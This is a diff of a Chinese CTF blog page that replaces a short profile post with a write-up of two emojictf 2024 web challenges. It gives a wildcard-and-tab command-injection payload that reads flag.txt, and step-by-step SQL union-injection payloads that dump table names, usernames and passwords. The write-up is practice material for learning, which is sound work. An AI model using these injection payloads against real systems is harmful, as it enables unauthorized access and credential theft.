@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>nlqxの个人简介! |  nlqx_the_мεtãΜÖrPhøSîs</title>
+      <title>web做题记录 |  nlqx_the_мεtãΜÖrPhøSîs</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-nlqxの个人简介"
+  id="post-web做题记录"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  nlqxの个人简介!
+  web做题记录
 </h1>
  
 
@@ -75,15 +75,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2024/11/11/nlqx%E3%81%AE%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/" class="article-date">
-  <time datetime="2024-11-11T08:55:15.000Z" itemprop="datePublished">2024-11-11</time>
+      <a href="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time datetime="2024-11-25T13:44:21.000Z" itemprop="datePublished">2024-11-25</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">57</span>
+            <span class="post-count">623</span>
         </span>
     </span>
 
@@ -92,7 +92,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -107,9 +107,68 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/opus/932531300882972740?spm_id_from=333.999.0.0">nlqx3220的动态 - 哔哩哔哩</a></p>
-<p>时效性不强但是确实比较完善</p>
-<h4 id="ctf感兴趣方向为web（主要但坐牢）、misc（次要但还行（？））、crypto（次次次要）"><a href="#ctf感兴趣方向为web（主要但坐牢）、misc（次要但还行（？））、crypto（次次次要）" class="headerlink" title="ctf感兴趣方向为web（主要但坐牢）、misc（次要但还行（？））、crypto（次次次要）"></a>ctf感兴趣方向为web（主要但坐牢）、misc（次要但还行（？））、crypto（次次次要）</h4><h6 id="先这样吧懒得写了-逃"><a href="#先这样吧懒得写了-逃" class="headerlink" title="先这样吧懒得写了(逃)"></a>先这样吧懒得写了(逃)</h6> 
+  <p>如标题，本人在做部分很简单的web题目总是想不起来要用什么知识点<del>（没有好好翻看笔记导致的）</del>，所以打算写一篇博客督促自己进行复习</p>
+<h3 id="emojictf-2024-“rce”"><a href="#emojictf-2024-“rce”" class="headerlink" title="emojictf 2024  “rce”"></a>emojictf 2024  “rce”</h3><p>题目提示：flag in flag.txt</p>
+<p>进入环境，什么都没有↓</p>
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/132465878.png" alt="132465878"></p>
+<p>此时先尝试右键查看源码，然后发现右键被ban了</p>
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/20241125221105.png" alt="20241125221105"></p>
+<p>直接加 <strong>view-source:</strong> 前缀查看源代码</p>
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/20241125221144.png" alt="20241125221144"></p>
+<p>去到robots.txt看到&#x2F;<a href="mailto:&#102;&#108;&#64;&#x67;&#46;&#112;&#x68;&#x70;">&#102;&#108;&#64;&#x67;&#46;&#112;&#x68;&#x70;</a>，直接访问</p>
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/20241125221816.png" alt="20241125221816"></p>
+<p>先粗略分析一波，发现ls没禁，所以直接看，并看到flag.txt在当前目录，所以就可以开始针对绕过进行构造。这里我看网上的wp有一篇提到了tail命令可以直接用（<a target="_blank" rel="noopener" href="https://lobsssa5dd5.github.io/2024/06/06/emojictf%20web&misc/%EF%BC%89%EF%BC%8C">https://lobsssa5dd5.github.io/2024/06/06/emojictf%20web&amp;misc/），</a> 但我当时并没有想到这个，说下我的思路。</p>
+<p><br>首先ban了空格，想办法对空格进行绕过。很明显的是${IFS}、$IFS$9被直接ban了，%20由于url转义也是用不了的，于是我想到了<b>%09水平制表符</b>。<br></p>
+<p><br>那么空格解决了，flag.txt正则凑一下也有了，现在还需要一个函数。我在这里想到了cat命令所在的路径<b>&gt;&#x2F;bin&#x2F;cat</b>&gt;。很明显这个路径是可以用正则表达式凑的，于是我最终成功拿到flag。<br></p>
+<p>exp：</p>
+<p><code>?emo=/?i?/?at%09?la?.???</code></p>
+<h3 id="emojictf-2024-“e4-sql”"><a href="#emojictf-2024-“e4-sql”" class="headerlink" title="emojictf 2024 “e4_sql”"></a>emojictf 2024 “e4_sql”</h3><p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1732602932434.jpg" alt="1732602932434"></p>
+<p>进入环境，首先先1’ or 1&#x3D;1#，发现登录失败，先是推测可能登录密码不能为空，还是失败，把单引改双引，成功拿到如下信息</p>
+<br>
+
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1732603106787.jpg" alt="1732603106787"><br></p>
+<br>
+
+<p>用这个账密登录，还是不行，说明登录界面可能是个摆设，需要我们去数据库查询。于是先用order by看有多少行<br></p>
+<br>
+
+<p><code>1&quot; or 1=1 order by 1#</code><br></p>
+<br>
+
+<p>但是flag直接弹出来了，有点…<br></p>
+<br>
+
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1732603303987.jpg" alt="1732603303987"><br></p>
+<br>
+
+<p><del>我们先当flag并没有弹出来，</del>然后order by判断出来有两行（1” or 1&#x3D;1 order by 3#时报错），于是就可以联合注入了。<br></p>
+<br>
+
+<p><code>1&quot; union select 1,database()#</code><br></p>
+<br>
+
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1732603451747.jpg" alt="1732603451747"><br></p>
+<br>
+
+<p>此时把数据库名爆出来了，下一步就是爆表名<br></p>
+<br>
+
+<p><code>1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;students&#39;)#</code><br></p>
+<br>
+
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1732603664306.jpg" alt="1732603664306"><br></p>
+<br>
+
+<p>只有一个表，且表名为information，那么我们针对这个表开始爆列名<br></p>
+<br>
+
+<p><code>1” union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;students&#39; and table_name=&#39;information&#39;)#</code><br></p>
+<br>
+
+<p><img src="/2024/11/25/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1732603890140.jpg" alt="1732603890140"><br></p>
+<p><br>最后把所有值全部爆出来，就能成功看到flag<br></p>
+<p><br><code>1&quot; union select group_concat(username),group_concat(password) from information#</code><br></p>
+ 
       <!-- reward -->
       
     </div>
@@ -131,53 +190,6 @@
     
     <footer class="article-footer">
        
-<div class="share-btn">
-      <span class="share-sns share-outer">
-        <i class="ri-share-forward-line"></i>
-        分享
-      </span>
-      <div class="share-wrap">
-        <i class="arrow"></i>
-        <div class="share-icons">
-          
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="ri-weibo-fill"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="ri-wechat-fill"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="ri-qq-fill"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="ri-douban-line"></i>
-          </a>
-          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a> -->
-          
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="ri-facebook-circle-fill"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="ri-twitter-fill"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="ri-google-fill"></i>
-          </a>
-        </div>
-      </div>
-</div>
-
-<div class="wx-share-modal">
-    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/11/11/nlqx%E3%81%AE%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div id="share-mask"></div>  
     </footer>
   </div>
 
@@ -185,9 +197,9 @@
   <nav class="article-nav">
     
     
-      <a href="/2024/11/10/nlqx/" class="article-nav-link">
+      <a href="/2024/11/11/newstar%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">nlqx</div>
+        <div class="article-nav-title">newstar复现</div>
       </a>
     
   </nav>
@@ -195,15 +207,7 @@
   
    
   
-   
-    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
-    <div id="twikoo" class="twikoo"></div>
-    <script>
-        twikoo.init({
-            envId: ""
-        })
-    </script>
- 
+    
 </article>
 
 </section>
@@ -242,8 +246,6 @@
     <ul>
       <li>
         <!-- cnzz统计 -->
-        
-        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
         
       </li>
     </ul>
@@ -287,7 +289,7 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/2019/about">关于我</a>
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://space.bilibili.com/356614993?spm_id_from=333.1007.0.0">联系我</a>
     </li>
     
   </ul>
@@ -551,8 +553,8 @@
     
     
     
-    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
-        src="//music.163.com/outchain/player?type=2&id=2013390709&auto=1&height=32"></iframe>
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=2013390709&auto=1&height=66"></iframe>
 </div>
 
 <style>
